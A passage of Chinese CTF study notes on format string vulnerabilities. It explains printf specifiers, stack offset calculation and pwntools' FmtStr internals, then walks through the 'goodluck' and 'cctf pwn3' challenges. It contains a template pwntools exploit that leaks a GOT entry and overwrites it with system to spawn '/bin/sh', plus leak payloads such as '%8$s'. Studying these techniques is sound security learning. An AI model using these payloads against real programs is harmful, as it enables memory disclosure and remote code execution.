c\"><table><tr><td class=\"code\"><pre><span class=\"line\">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>parameter</p>\n<ul>\n<li><code>%n$</code>，获取格式化字符串中的指定参数</li>\n</ul>\n</li>\n<li><p>field width</p>\n<ul>\n<li>输出的最小宽度</li>\n</ul>\n</li>\n<li><p>precision</p>\n<ul>\n<li>输出的最大长度</li>\n</ul>\n</li>\n<li><p>length，输出的长度</p>\n<ul>\n<li>hh，输出一个字节</li>\n<li>h，输出一个双字节</li>\n</ul>\n</li>\n<li><p>type</p>\n<ul>\n<li>d/i，有符号整数</li>\n<li>u，无符号整数</li>\n<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>s，如果没有用 l 标志，输出 null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>\n<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>\n<li><strong>p， void * 型，输出对应变量的值</strong>。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>\n<li>n，不输出字符，<strong>但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</strong>。</li>\n</ul>\n</li>\n</ul>\n<h3><span id=\"格式化字符串漏洞利用\">格式化字符串漏洞利用</span></h3><p>  一般来说就是打印变量的时候并没有对变量进行格式化，或者格式化的方式并不正确。</p>\n<p>  一般来说不正确的方式有这几种</p>\n<ol>\n<li>一直%s，容易引用不合法的地址，造成程序崩溃   </li>\n<li><p>通过打印的相关内存信息，泄露内存布局，获得有用的信息</p>\n<p>重点研究如何计算32/64位程序中格式化字符串在栈上的偏移，以及研究自动化求偏移的实现</p>\n<h3><span id=\"132位偏移计算原理\">1）32位偏移计算原理</span></h3><p>​    其实这个计算确实是有手就行，只需要在栈上找到对应的格式化字符串，然后数是第几个，再减去返回地址所占的一个位置，就是偏移量。</p>\n<p>​    准确来说应该是格式化字符串在栈上的偏移。</p>\n<p>​    原理也比较简单：x86架构下，格式化字符串是通过栈传递的。</p>\n<p>​    然后联想一下函数调用栈的知识点，格式化字符串本身和printf的参数一样，从右到左依次被压栈。</p>\n<p>​    举一个例子，源码来源于<a href=\"https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html\">3.1.1 格式化字符串漏洞</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//test1.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s %d %s&quot;</span>, <span class=\"string\">&quot;Hello World!&quot;</span>, <span class=\"number\">233</span>, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​    这个程序没有任何的漏洞，只是因为非常简单直观，拿来研究printf函数参数的传参。</p>\n<p>​    我们以32位编译。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gcc -m32 test1.c -o test1</span><br></pre></td></tr></table></figure>\n<p>​    在main函数处下一个断点。然后执行到断点处。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png\" alt=\"截屏2021-10-28 下午11.35.36\"></p>\n<p>​    随便多单步几次，可以看到push指令，此刻主调函数已经开始向栈中压入参数了，从<code>stack</code></p>\n<p>部分我们可以看到，此时栈里已经有一个参数”\\n”。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png\" alt=\"截屏2021-10-28 下午11.38.15\">    </p>\n<p>​    继续单步，观察栈的变化，此时栈顶已经扩大了很多，printf的所有需要的参数都在栈中。然后我们需要调用printf函数。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png\" alt=\"截屏2021-10-28 下午11.40.00\"></p>\n<p>​    可以看到，这条指令call printf，我们刚刚压栈的参数此时被printf使用。执行完后的下一条指令使esp加0x10，栈空间缩小，回到最初的样子：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png\" alt=\"截屏2021-10-28 下午11.41.43\"></p>\n<p>​    然后回忆一下被调函数参数和局部变量压栈的过程：</p>\n<p>​    主调函数将被调函数参数从右到左压入栈中，随后将返回地址压栈，此时，栈上的参数偏移的计算就非常清晰了。</p>\n<p>​    这里可能有些弯需要理解一下。大致就是刚刚说到的，主调函数首先将printf需要的函数从右到左依次压栈，（正好栈是从高地址向低地址增长的，所以在gdb stack中呈现的顺序是正常理解的从左到右的先后次序），当将printf需要的参数全部存到栈中后，即可调用printf使用这些参数，此时的栈帧尚属于主调函数，在这个程序中我们不考虑返回地址，所以当参数全部入栈，printf即被调用，栈顶也指向格式化字符串所在的地址。在这里，格式化字符串就是栈上的第一个参数，偏移量就是1。当printf调用完毕，参数即出栈，也就不存在什么格式化字符串偏移了。    </p>\n<h3><span id=\"264位偏移计算原理\">2）64位偏移计算原理</span></h3><p>​        原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。</p>\n<h3><span id=\"3-pwntools_fmtstr工具\">3） pwntools_fmtstr工具</span></h3><p>​    在前面的分析中我们可以看到，其实找到格式化字符串的偏移量是一件非常简单的事情，都1202年了，既然是简单的步骤，我们应该需要学会运用自动化工具，使做题步骤简化，比如偏移量的寻找，以及与格式化字符串利用相关的一些事。</p>\n<p>​    pwntools就非常人性化地为我们集成了格式化字符串偏移量寻找，got表覆盖等非常常见好用的操作，这里我们通过简单的例子，着重讨论这些自动化脚本编写的原理。</p>\n<h5><span id=\"例子\">例子</span></h5><p>​    例如，这是一段自动化的格式化字符串漏洞利用的脚本，主要适用于rop并改got表的板子题。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算偏移量</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exec_fmt</span>(<span class=\"params\">payload</span>):</span></span><br><span class=\"line\">    r.sendline(payload)</span><br><span class=\"line\">    info = r.recv()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> info</span><br><span class=\"line\">  </span><br><span class=\"line\">auto = FmtStr(exec_fmt)</span><br><span class=\"line\">offset = auto.offset</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获得 func 的 got 地址</span></span><br><span class=\"line\">func_got = elf.got[<span class=\"string\">&#x27;func&#x27;</span>]<span class=\"comment\">#func通常是一些例如printf或puts的函数</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;func_got =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(func_got)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获得 func 的真实地址</span></span><br><span class=\"line\">payload = p32(func_got) + <span class=\"string\">&#x27;%&#123;&#125;$s&#x27;</span>.<span class=\"built_in\">format</span>(offset)</span><br><span class=\"line\">r.send(payload)</span><br><span class=\"line\">func_addr = u32(r.recv()[<span class=\"number\">4</span>:<span class=\"number\">8</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;func_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(func_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获得 system 的真实地址</span></span><br><span class=\"line\">system_addr = func_addr - (libc.symbols[<span class=\"string\">&#x27;func&#x27;</span>] - libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;)</span><br><span class=\"line\">r.send(payload)</span><br><span class=\"line\">r.send(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<p>​    </p>\n<p>​    其中脚本的核心就是pwntools的fmtstr功能。fmtstr几乎完全自动化地帮我们完成了偏移寻找，got表覆盖等工作，大大简化了我们的做题流程。</p>\n<h5><span id=\"源码分析\">源码分析</span></h5><p>​    pwntools定义了一个<code>FmtStr</code>类，来实现格式化字符串漏洞的利用。</p>\n<p>​    ps：了解该源码分析需要首先了解简单的面向对象的python程序设计。因为我也不太懂，所以画了个图来归纳一下，大概就是：<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg\" alt=\"IMG_0352\"></p>\n<p>​    所以下图中的代码也就能够理解了，就是将参数传入实例本身。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png\" alt=\"截屏2021-10-29 下午2.08.21\"></p>\n</li>\n</ol>\n<p>  ​    然后，是功能实现的第一步—偏移的寻找，也是这篇笔记重点要分析的部分，完整的源码分析会写成一个新的系列。</p>\n<p>  ​    很显然这个功能的实现是基于<code>find_offset</code>方法。</p>\n<p>  ​    方法的内容其实比较简单：</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">find_offset</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">      marker = cyclic(<span class=\"number\">20</span>)<span class=\"comment\">#cyclic 20个字符</span></span><br><span class=\"line\">      <span class=\"keyword\">for</span> off <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">1000</span>):<span class=\"comment\">#从1-1000，爆破偏移量</span></span><br><span class=\"line\">          leak = self.leak_stack(off, marker)</span><br><span class=\"line\">          leak = pack(leak)<span class=\"comment\">#leak = p(leak_stack)</span></span><br><span class=\"line\">          pad = cyclic_find(leak[:<span class=\"number\">4</span>])</span><br><span class=\"line\">          <span class=\"keyword\">if</span> pad &gt;= <span class=\"number\">0</span> <span class=\"keyword\">and</span> pad &lt; <span class=\"number\">20</span>:</span><br><span class=\"line\">              <span class=\"keyword\">return</span> off, pad</span><br><span class=\"line\">      <span class=\"keyword\">else</span>:</span><br><span class=\"line\">          log.error(<span class=\"string\">&quot;Could not find offset to format string on stack&quot;</span>)</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"literal\">None</span>, <span class=\"literal\">None</span></span><br></pre></td></tr></table></figure>\n<p>  ​    而实现方法<code>find_offset</code>，又依靠方法<code>leak_stack</code></p>\n  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak_stack</span>(<span class=\"params\">self, offset, prefix=<span class=\"string\">b&quot;&quot;</span></span>):</span></span><br><span class=\"line\">    payload = <span class=\"string\">b&quot;START%%%d$pEND&quot;</span> % offset</span><br><span class=\"line\">    leak = self.execute_fmt(prefix + payload)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        leak = re.findall(<span class=\"string\">br&quot;START(.*?)END&quot;</span>, leak, re.MULTILINE | re.DOTALL)[<span class=\"number\">0</span>]</span><br><span class=\"line\">        leak = <span class=\"built_in\">int</span>(leak, <span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        leak = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> leak</span><br></pre></td></tr></table></figure>\n<p>  ​    <code>cyclic</code>的代码也顺便放一放（</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cyclic_find</span>(<span class=\"params\">subseq, alphabet = <span class=\"literal\">None</span>, n = <span class=\"literal\">None</span></span>):</span> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> n <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        n = context.cyclic_size</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(subseq, six.integer_types):</span><br><span class=\"line\">        subseq = packing.pack(subseq, <span class=\"built_in\">bytes</span>=n)</span><br><span class=\"line\">    subseq = packing._need_bytes(subseq, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(subseq) != n:</span><br><span class=\"line\">        log.warn_once(<span class=\"string\">&quot;cyclic_find() expects %i-byte subsequences by default, you gave %r\\n&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;Unless you specified cyclic(..., n=%i), you probably just want the first 4 bytes.\\n&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;Truncating the data at 4 bytes.  Specify cyclic_find(..., n=%i) to override this.&quot;</span>,</span><br><span class=\"line\">            n, subseq, <span class=\"built_in\">len</span>(subseq), <span class=\"built_in\">len</span>(subseq))</span><br><span class=\"line\">        subseq = subseq[:n]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> alphabet <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        alphabet = context.cyclic_alphabet</span><br><span class=\"line\">    alphabet = packing._need_bytes(alphabet, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">any</span>(c <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> alphabet <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> subseq):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> -<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    n = n <span class=\"keyword\">or</span> <span class=\"built_in\">len</span>(subseq)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> _gen_find(subseq, de_bruijn(alphabet, n))</span><br></pre></td></tr></table></figure>\n<p>  ​    之前一直对<code>cyclic</code>的实现抱有兴趣，抽个时间可以看看源码分析。</p>\n<p>  ​    </p>\n<h1><span id=\"3实际利用\">3）实际利用</span></h1><h2><span id=\"1goodluck\">1:goodluck</span></h2><p>  话不多说，直接上例子。</p>\n<h4><span id=\"程序逻辑分析\">程序逻辑分析</span></h4><p>  第一步，清晰而准确的逆向是漏洞点利用的基础。</p>\n<p>  首先，程序读取flag，通过<code>_IO_getc(fp)</code>，一个字符一个字符地将flag读入v10。</p>\n<p>  然后将flag的首地址给v9。</p>\n<p>  然后刷新缓冲区。这里这个fflush函数，以前没有怎么深入了解过（</p>\n<p>  然后看一个关于fflush的详解</p>\n<p>  <a href=\"http://c.biancheng.net/cpp/html/2506.html\">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>\n<p>  但是文章中讲的是stdin，和这里的bss段关联感觉并不大，我疑惑的地方不是为什么要fflush，而是疑惑bss段有什么东西。</p>\n<p>  bss段存储未初始化的全局变量，也不是缓冲区吧。</p>\n<h4><span id=\"缓冲区\">缓冲区</span></h4><p>  <em>从一个简单的fflush函数中，我们试图理解缓冲区的原理和这个函数被设置的意义。</em></p>\n<p>  为了减少cpu对磁盘的读写次数，提高运行速度，缓冲区（这里特指buf）存储了我们的键盘，屏幕输入输出。当我们将字符通过键盘输入到缓冲区中，<code>cingetchar</code>函数再从缓冲区中读取我们的键盘输入，从而进行数据的操作。屏幕输出也是同理。</p>\n<h5><span id=\"缓冲区的分类\">缓冲区的分类</span></h5><h6><span id=\"1全缓冲\">1:全缓冲。</span></h6><p>  只有在缓冲区被填满之后才会进行<code>I/O</code>操作；最典型的全缓冲就是对磁盘文件的读写。</p>\n<h6><span id=\"2行缓冲\">2:行缓冲</span></h6><p>  只有在输入或者是输出中遇到换行符的时候才会进行<code>I/O</code>操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做<code>I/O</code>操作。一般来说，标准输入流(<code>stdin</code>)和标准输出流(<code>stdout</code>)是行缓冲</p>\n<h6><span id=\"3无缓冲\">3:无缓冲</span></h6><ol>\n<li><p>无缓冲；标准<code>I/O</code>不缓存字符；其中表现最明显的就是标准错误输出流(<code>stderr</code>)，这使得出错信息尽快的返回给用户。</p>\n<p>（我以前一直不是很能理解为什么要专门设置一个标准错误，现在知道了，如果error的输出有缓冲区的话，可能要等程序执行到最后才会报错，这样就不能即时地接收到报错）</p>\n<h5><span id=\"fflush函数\">fflush函数</span></h5><p>然后是关于fflush函数的glibc源码。</p>\n<p>fflush实际是调用vtable中的函数<code>_IO_new_file_sync</code>，这个函数的源码如图：</p>\n<p>（<code>/glibc-2.23/libio/fileops.c:867</code>）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span></span><br><span class=\"line\">_IO_new_file_sync (_IO_FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _IO_ssize_t delta;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> retval = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/*    char* ptr = cur_ptr(); */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (_IO_do_flush(fp)) </span><br><span class=\"line\">    <span class=\"keyword\">return</span> EOF;<span class=\"comment\">//end of file</span></span><br><span class=\"line\">  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (delta != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> TODO</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (_IO_in_backup (fp))</span><br><span class=\"line\">\tdelta -= eGptr () - Gbase ();</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">      _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (new_pos != (_IO_off64_t) EOF)</span><br><span class=\"line\">\tfp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> ESPIPE</span></span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (errno == ESPIPE)</span><br><span class=\"line\">\t; <span class=\"comment\">/* Ignore error from unseekable devices. */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">\tretval = EOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (retval != EOF)</span><br><span class=\"line\">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class=\"line\">  <span class=\"comment\">/* <span class=\"doctag\">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class=\"line\">  <span class=\"comment\">/*    setg(base(), ptr, ptr); */</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> retval;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)</span><br></pre></td></tr></table></figure>\n<p>虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。</p>\n<h5><span id=\"pwntools与缓冲区机制\">pwntools与缓冲区机制</span></h5><p>某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。</p>\n<p>为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见<a href=\"https://fuurinko.github.io/2021/10/27/摆烂第五天--pwntools源%20码%20剖%20析--以源码的角度分析io交互原理/\">pwntools源码剖析（1）—以源码的角度分析io交互原理</a></p>\n</li>\n</ol>\n<h4><span id=\"ms\">%ms？</span></h4><p>  从缓冲区的研究回到程序的简单逻辑分析上。</p>\n<p>  <code>__isoc99_scanf(&quot;%ms&quot;, &amp;format);</code></p>\n<p>  接着就来了这么一句，我第一次听说m这个参数，其实就是动态的分配了scanf的缓冲区，有效避免了溢出。（stackoverflow上回答废话一堆，说得云里雾里）</p>\n<p>  然后接着又是一个手写的read函数，再将输入的字符串赋给v4，再将v4与flag比较，如果错误，就来一个格式化字符串的漏洞。</p>\n<h3><span id=\"漏洞利用\">漏洞利用</span></h3><p>  因为程序其实已经拿到flag了，所以这道题并不需要考虑getshell。只需要通过刚才的格式化字符串漏洞，将flag打印出来。</p>\n<p>  那么如何打印这个flag呢？</p>\n<p>  我们首先肯定要输入一个错误的flag（废话），然后进入与flag的比较，这个时候，flag的具体的值也在内存中。所以随便动调一下。</p>\n<p>  <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png\" alt=\"截屏2021-10-26 下午10.31.45\"></p>\n<p>  flag其实就已经出来了，但是为了学习，我们还需要将它打印出来。</p>\n<p>  这时候就需要计算这个flag字符串与栈顶的偏移。</p>\n<p>  <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.35.39.png\" alt=\"截屏2021-10-26 下午10.35.39\"></p>\n<p>  显然flag在栈顶第四个参数的位置，除去第一行的返回地址，也就是第三个。但是由于64位程序，前6个参数是由寄存器传参，所以需要+6，也就是第九个参数。</p>\n<p>  利用%n$s打印参数，即可获得flag。</p>\n<h2><span id=\"2cctf-pwn3\">2）cctf pwn3</span></h2><p>  经过刚才的开胃菜，我们总算进入了正题。</p>\n<p>  一般来说，getshell的其中一种非常常见的手法就是改函数got表为另外某个函数。尤其是没有栈溢出，并且并没有开启relro的情况下，这种手法几乎是最通用的解法。</p>\n<p>  但是如果需要修改函数的got表，我们需要满足几个条件：</p>\n<ol>\n<li>知道需要修改的函数的真实地址。</li>\n<li>需要想办法改写函数的got表。</li>\n</ol>\n<p>  一般来说，一个没有漏洞的程序，想要实现以上任意一点都是很难的，但是毕竟还是ctf题（</p>\n<p>  回归正题，我们可以用格式化字符串漏洞来解决以上两个问题，详见例子</p>\n<h2><span id> </span></h2><h3><span id=\"程序分析\">程序分析</span></h3><p>  <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png\" alt=\"截屏2021-10-27 上午8.50.03\"></p>\n<p>  还是先进行一个简单的逻辑分析。</p>\n<p>  首先要求登陆，然后在系统中有三个功能，get file ，put file 和show file，基本就是put一个文件，输入文件名和内容，然后可以get文件和show文件。（虽然我没看明白这个get和show函数有什么区别）显然在get file 中，存在一个格式化字符串漏洞。</p>\n<p>  <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png\" alt=\"截屏2021-10-27 上午9.02.34\"></p>\n<p>  所以思路其实很清晰，首先我们并不知道密码，要登录进去，还需要绕过一个密码的检测。</p>\n<p>  当我们成功登陆，直接确定格式化字符串相对栈的偏移，然后打印函数的真实地址，通过地址确定libc基址，再修改函数got表位systen的地址从而getshell，这也是一般的格式化字符串的板子题常见套路。</p>\n<p>  ps:用wiki给的exp动调一下，把断点下在发送payload之前。如果调试不当可能会造成<code>ERROR: Could not find ELF base!</code></p>\n<p>  原因详见<a href=\"https://fuurinko.github.io/2021/10/27/gdb附加调试的一些黑魔法/的2.1节。\">https://fuurinko.github.io/2021/10/27/gdb附加调试的一些黑魔法/的2.1节。</a></p>\n<h4><span id=\"绕过密码检测\">绕过密码检测</span></h4>  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#ask_username.c </span></span><br><span class=\"line\"> <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">39</span> &amp;&amp; src[i]; ++i )</span><br><span class=\"line\">   ++src[i];</span><br><span class=\"line\"> <span class=\"comment\">#ask_password.c</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( strcmp(s1, <span class=\"string\">&quot;sysbdmin&quot;</span>) )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   puts(<span class=\"string\">&quot;who you are?&quot;</span>);</span><br><span class=\"line\">   exit(<span class=\"number\">1</span>);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>  进入程序会有一个比较简单的小check，我们所输入的用户名的ascii需要小于<code>sysbdmin</code>,可以直接用符合条件的username来绕过检测。(strcmp是以ascii码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的ascii小，但字符长度相等的字符。)</p>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#rxraclhm</span><br></pre></td></tr></table></figure>\n<h4><span id=\"寻找格式化字符串在栈中的偏移\">寻找格式化字符串在栈中的偏移</span></h4><p>  当我们绕过了密码，然后就需要打印puts函数的真实地址。</p>\n<p>  打印真实地址，第一步需要找到格式化字符串在栈中的偏移。</p>\n<p>  ps：关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。</p>\n<p>  原理参见：<a href=\"https://fuurinko.github.io/2021/10/27/摆烂第六天--格式化字符串偏移计算原理/\">https://fuurinko.github.io/2021/10/27/摆烂第六天--格式化字符串偏移计算原理/</a></p>\n<p>  <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8A%E5%8D%8811.01.05.png\" alt=\"截屏2022-03-22 上午11.01.05\"></p>\n<p>  ​        可以看到我们输入的格式化字符串的地址位于第八个参数。</p>\n<h4><span id=\"利用漏洞泄露地址\">利用漏洞泄露地址</span></h4><p>  ​        既然找到了格式化字符串的偏移，那么就可以利用它来泄露内存了。</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># get the addr of puts</span></span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;puts got : &#x27;</span> + <span class=\"built_in\">hex</span>(puts_got))</span><br><span class=\"line\">put(<span class=\"string\">b&#x27;aa&#x27;</span>, <span class=\"string\">b&#x27;%8$s&#x27;</span> + p32(puts_got))</span><br><span class=\"line\">puts_addr = u32(get(<span class=\"string\">&#x27;1111&#x27;</span>)[:<span class=\"number\">4</span>])</span><br></pre></td></tr></table></figure>\n<p>  put一个名为aa的文件，内容是格式化字符串以及puts的got表地址。</p>\n<p>  这里<code>%8$s + p32(puts_got)</code>先把puts的got表传进去，然后再通过%8$s打印。</p>\n<p>  然后接收信息，就是puts的got表地址。</p>\n<p>  <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8A%E5%8D%8811.13.31.png\" alt=\"截屏2022-03-22 上午11.13.31\"></p>\n<h4><span id=\"利用格式化字符串覆盖puts的got表\">利用格式化字符串覆盖puts的got表</span></h4><h5><span id=\"fmt模块实现\">fmt模块实现</span></h5>  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = fmtstr_payload(<span 